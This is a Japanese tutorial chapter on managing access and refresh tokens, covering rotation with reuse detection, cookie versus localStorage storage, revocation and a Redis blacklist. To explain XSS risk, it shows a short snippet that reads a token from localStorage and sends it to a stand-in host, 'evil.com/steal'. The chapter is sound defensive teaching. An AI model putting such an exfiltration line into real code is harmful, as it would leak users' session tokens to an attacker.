---
title: "トークン管理"
---

## この章で学ぶこと

この章では、トークンベース認証の運用面に焦点を当てます。アクセストークンとリフレッシュトークンの役割を理解し、安全な保存・更新・無効化の方法を実践的に学びます。

- アクセストークンとリフレッシュトークンの違いと使い分け
- トークンローテーションによるセキュリティ強化
- トークンの保存場所（Cookie vs localStorage）の選び方
- トークン無効化とブラックリストの実装パターン

---

## アクセストークンとリフレッシュトークン

トークンベース認証では、2 種類のトークンを組み合わせて使います。

### なぜ 2 つのトークンが必要なのか

1 つのトークンだけでは、**セキュリティと利便性の両立**が困難です。

| 方式 | セキュリティ | ユーザー体験 |
|------|------------|-------------|
| 長命トークン 1 つだけ（30 日） | 漏洩時に長期間悪用される | ログイン頻度が少なく快適 |
| 短命トークン 1 つだけ（15 分） | 漏洩の影響が小さい | 15 分ごとに再ログインが必要 |
| **アクセス + リフレッシュ** | **短命 AT で漏洩リスクを限定** | **RT による自動更新で快適** |

### それぞれの役割

**アクセストークン（AT）** は API へのリクエスト時に毎回送信するトークンです。

- 用途：API アクセスの認可
- 寿命：短命（15 分〜1 時間）
- 検証方法：ステートレス（署名の確認のみ、DB 不要）
- 形式：JWT（署名付きの自己完結型トークン）
- 送信方法：`Authorization: Bearer <token>` ヘッダー

**リフレッシュトークン（RT）** は新しい AT を取得するためだけに使うトークンです。

- 用途：期限切れの AT を更新する
- 寿命：長命（7 日〜30 日）
- 検証方法：ステートフル（サーバー側の DB で管理）
- 形式：不透明トークン（ランダム文字列）
- 送信方法：HttpOnly Cookie または専用エンドポイント

### ライフサイクルの流れ

```
t=0    ログイン → AT（15分有効）+ RT（7日有効）を発行
t=14m  APIリクエスト → ATが有効 → 成功
t=16m  APIリクエスト → ATが期限切れ → 401エラー
t=16m  RTを使ってATを更新 → 新AT（15分）+ 新RT（7日）を発行
t=31m  APIリクエスト → 新ATが有効 → 成功
  ...
t=7d   RTが期限切れ → 再ログインを要求
```

ユーザーがアプリを使い続けている限り、RT によって AT が自動的に更新されるため、再ログインを求められることがありません。

### トークン発行の実装例

```typescript
import { SignJWT } from "jose";
import crypto from "crypto";

const JWT_SECRET = new TextEncoder().encode(process.env.JWT_SECRET!);

// アクセストークンの発行
async function issueAccessToken(userId: string, role: string): Promise<string> {
  return new SignJWT({ sub: userId, role, type: "access" })
    .setProtectedHeader({ alg: "HS256" })
    .setIssuedAt()
    .setExpirationTime("15m")
    .setJti(crypto.randomUUID())
    .sign(JWT_SECRET);
}

// リフレッシュトークンの発行（ランダム文字列）
function issueRefreshToken(): string {
  return crypto.randomBytes(32).toString("hex");
}

// ハッシュ化して DB に保存する（平文保存は厳禁）
function hashToken(token: string): string {
  return crypto.createHash("sha256").update(token).digest("hex");
}
```

RT を JWT ではなくランダム文字列にしている理由は、RT は必ずサーバー側で DB を参照して検証するため、JWT のステートレス検証の利点がないためです。情報を含まないランダム文字列の方が漏洩時のリスクが低くなります。

---

## トークンローテーション

### Rotation なしの問題

RT を使い回す方式では、一度 RT が漏洩すると攻撃者が RT の有効期限まで AT を取得し放題になります。

### Refresh Token Rotation の仕組み

**Refresh Token Rotation** では、リフレッシュのたびに新しい RT を発行し、古い RT を無効化します。

```
RT-1 → 新AT + RT-2（RT-1は無効化）
RT-2 → 新AT + RT-3（RT-2は無効化）
→ 各RTは1回しか使えない
```

### 再利用検知（Reuse Detection）

Rotation の真価は**不正使用を検知できる**点にあります。

1. 攻撃者が RT-1 を窃取する
2. 正規ユーザーが先に RT-1 を使用 → RT-2 が発行される（RT-1 は使用済みに）
3. 攻撃者が RT-1 を使おうとする → 「使用済み RT の再利用」を検知
4. サーバーがそのファミリー（RT-1, RT-2, ...）を全て無効化
5. ユーザーに再ログインとセキュリティ通知を要求

**トークンファミリー**とは、1 回のログインから派生した全 RT をグループ化する仕組みです。ログイン時に `familyId` を発行し、同じセッションの RT は全て同じ `familyId` を持ちます。

### Rotation の実装例

```typescript
async function refreshWithRotation(refreshToken: string) {
  const hashedToken = hashToken(refreshToken);
  const currentRT = await db.refreshToken.findUnique({
    where: { token: hashedToken },
  });

  if (!currentRT || currentRT.expiresAt < new Date()) {
    throw new Error("Invalid or expired refresh token");
  }

  // 再利用検知：既に使用済みのRTが再度使われた
  if (currentRT.usedAt) {
    await db.refreshToken.deleteMany({
      where: { familyId: currentRT.familyId },
    });
    throw new Error("Token reuse detected - all sessions revoked");
  }

  const newRT = issueRefreshToken();

  await db.$transaction([
    db.refreshToken.update({
      where: { id: currentRT.id },
      data: { usedAt: new Date(), replacedBy: hashToken(newRT) },
    }),
    db.refreshToken.create({
      data: {
        token: hashToken(newRT),
        userId: currentRT.userId,
        familyId: currentRT.familyId,
        expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
      },
    }),
  ]);

  const newAT = await issueAccessToken(currentRT.userId, currentRT.user.role);
  return { accessToken: newAT, refreshToken: newRT };
}
```

---

## トークンの保存場所：Cookie vs localStorage

クライアント側でトークンをどこに保存するかは、セキュリティに直結する重要な設計判断です。

### 保存場所の比較

| 保存場所 | XSS 耐性 | CSRF 耐性 | 推奨度 |
|---------|---------|---------|-------|
| **HttpOnly Cookie** | 高い（JS からアクセス不可） | 要対策（SameSite 等） | 最推奨 |
| メモリ変数 | 高い | 高い | AT のみなら可 |
| sessionStorage | 低い（XSS で読まれる） | 高い | 限定用途 |
| localStorage | 低い（XSS で読まれる） | 高い | 非推奨 |

### なぜ HttpOnly Cookie が最推奨なのか

HttpOnly Cookie に保存したトークンは JavaScript からアクセスできません。

```javascript
// localStorageの場合 → XSS攻撃で盗まれる
const stolen = localStorage.getItem("accessToken");
fetch("https://evil.com/steal", { body: stolen });

// HttpOnly Cookieの場合 → JavaScriptから一切アクセスできない
document.cookie; // HttpOnly Cookieは表示されない
```

Cookie はブラウザが自動送信するため CSRF のリスクがありますが、`SameSite=Lax` や `SameSite=Strict` の設定と CSRF トークンの併用で対策できます。

### Cookie 設定の実装例

```typescript
function setTokenCookies(response: NextResponse, tokens: {
  accessToken: string;
  refreshToken: string;
}) {
  const isProduction = process.env.NODE_ENV === "production";

  response.cookies.set("access_token", tokens.accessToken, {
    httpOnly: true,       // JavaScriptからアクセス不可
    secure: isProduction, // 本番ではHTTPSのみ
    sameSite: "lax",      // CSRF対策
    path: "/api",          // APIエンドポイントのみで送信
    maxAge: 15 * 60,       // 15分
  });

  response.cookies.set("refresh_token", tokens.refreshToken, {
    httpOnly: true,
    secure: isProduction,
    sameSite: "strict",    // より厳格なCSRF対策
    path: "/api/auth",      // 認証エンドポイントのみで送信
    maxAge: 7 * 24 * 60 * 60, // 7日
  });

  return response;
}
```

`path` を分けているのがポイントです。RT は `/api/auth` にしか送信されないため、攻撃対象のエンドポイントが限定されます。

---

## トークン無効化

JWT は発行後に「取り消す」仕組みを持ちません。しかし、ログアウト、パスワード変更、不正アクセス検知、退職者対応などの場面ではトークンを無効化する必要があります。

### 無効化の 3 つの方法

| 方法 | 即時性 | 仕組み | 適した場面 |
|-----|-------|-------|----------|
| RT 削除 | 低い（AT 失効まで待つ） | DB から RT を削除 | 通常のログアウト |
| Token Version | 準即時 | ユーザーのバージョン番号を AT に埋め込み、変更時にインクリメント | パスワード変更 |
| ブラックリスト | 即時 | AT の jti を Redis に保存してチェック | セキュリティインシデント |

**複合方式**がおすすめです。場面に応じて使い分けます。

### Token Version の実装

```typescript
// パスワード変更時にバージョンをインクリメント
async function changePassword(userId: string, newPassword: string) {
  await db.$transaction([
    db.user.update({
      where: { id: userId },
      data: {
        password: await bcrypt.hash(newPassword, 12),
        tokenVersion: { increment: 1 },
      },
    }),
    db.refreshToken.deleteMany({ where: { userId } }),
  ]);
}

// AT 検証時にバージョンをチェック
async function verifyWithVersion(payload: JWTPayload) {
  const user = await db.user.findUnique({
    where: { id: payload.sub as string },
    select: { tokenVersion: true },
  });
  if (user?.tokenVersion !== payload.token_version) {
    throw new Error("Token revoked (version mismatch)");
  }
}
```

---

## ブラックリスト

### ブラックリストの仕組み

無効化したい AT の識別子（`jti`）を Redis に保存し、API リクエストのたびにチェックする方式です。AT の有効期限が過ぎれば Redis の TTL で自動削除されるため、データが際限なく増えることはありません。

### 実装例

```typescript
import Redis from "ioredis";

class TokenBlacklist {
  private redis: Redis;

  constructor(redisUrl: string) {
    this.redis = new Redis(redisUrl);
  }

  async revoke(jti: string, expiresAt: Date): Promise<void> {
    const ttl = Math.ceil((expiresAt.getTime() - Date.now()) / 1000);
    if (ttl > 0) {
      await this.redis.setex(`blacklist:${jti}`, ttl, "1");
    }
  }

  async revokeAllForUser(userId: string): Promise<void> {
    await this.redis.setex(
      `blacklist:user:${userId}`,
      900,  // 15分（ATの最大有効期限）
      Date.now().toString()
    );
  }

  async isRevoked(jti: string, userId: string, iat: number): Promise<boolean> {
    if (await this.redis.exists(`blacklist:${jti}`)) return true;
    const revokedAt = await this.redis.get(`blacklist:user:${userId}`);
    if (revokedAt && iat * 1000 < parseInt(revokedAt)) return true;
    return false;
  }
}
```

---

## クライアント側の自動リフレッシュ

AT が期限切れになったとき、バックグラウンドで自動的にリフレッシュする実装が一般的です。複数の API リクエストが同時に 401 を受け取った場合でもリフレッシュを 1 回だけ実行するよう、`isRefreshing` フラグとキューで制御します。

```typescript
let isRefreshing = false;
let failedQueue: Array<{ resolve: Function; reject: Function }> = [];

api.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;
    if (error.response?.status !== 401 || originalRequest._retry) {
      return Promise.reject(error);
    }

    if (isRefreshing) {
      return new Promise((resolve, reject) => {
        failedQueue.push({ resolve, reject });
      }).then(() => api(originalRequest));
    }

    originalRequest._retry = true;
    isRefreshing = true;

    try {
      await api.post("/auth/refresh");
      failedQueue.forEach(({ resolve }) => resolve());
      failedQueue = [];
      return api(originalRequest);
    } catch (refreshError) {
      failedQueue.forEach(({ reject }) => reject(refreshError));
      failedQueue = [];
      window.location.href = "/login?reason=session_expired";
      return Promise.reject(refreshError);
    } finally {
      isRefreshing = false;
    }
  }
);
```

---

## まとめ

| 項目 | 推奨設定・方針 |
|------|-------------|
| AT の有効期限 | 15 分（業界に応じて 5 分〜1 時間） |
| RT の有効期限 | 7 日（モバイルは最大 90 日） |
| トークンローテーション | 必須。リフレッシュのたびに新 RT を発行 |
| 再利用検知 | トークンファミリー全体を即時無効化 |
| AT の保存場所 | HttpOnly Cookie（`path=/api`） |
| RT の保存場所 | HttpOnly Cookie（`path=/api/auth`） |
| RT の DB 保存 | SHA-256 でハッシュ化して保存（平文厳禁） |
| 無効化方式 | RT 削除 + Token Version + ブラックリストの複合 |
| localStorage | トークン保存には使わない |
| URL パラメータ | トークンを含めない |

---

## やってみよう！

以下の課題に取り組んで、トークン管理の理解を深めましょう。

- [ ] **トークン発行**：AT（JWT）と RT（ランダム文字列）のペアを発行する関数を書いてみましょう。RT は SHA-256 でハッシュ化してからデータベースに保存します
- [ ] **Refresh Token Rotation**：RT のリフレッシュ時に新しい RT を発行し、古い RT を「使用済み」としてマークする処理を実装してみましょう。使用済み RT が再利用されたら、そのファミリー全体を削除してください
- [ ] **Cookie 設定**：`httpOnly`、`secure`、`sameSite`、`path` を適切に設定した Cookie でトークンを返すエンドポイントを実装してみましょう
- [ ] **ブラックリスト**：Redis を使って AT の `jti` をブラックリストに登録し、API ミドルウェアでチェックする仕組みを作ってみましょう
- [ ] **自動リフレッシュ**：Axios インターセプターで 401 応答時に自動リフレッシュし、元のリクエストをリトライする仕組みを実装してみましょう
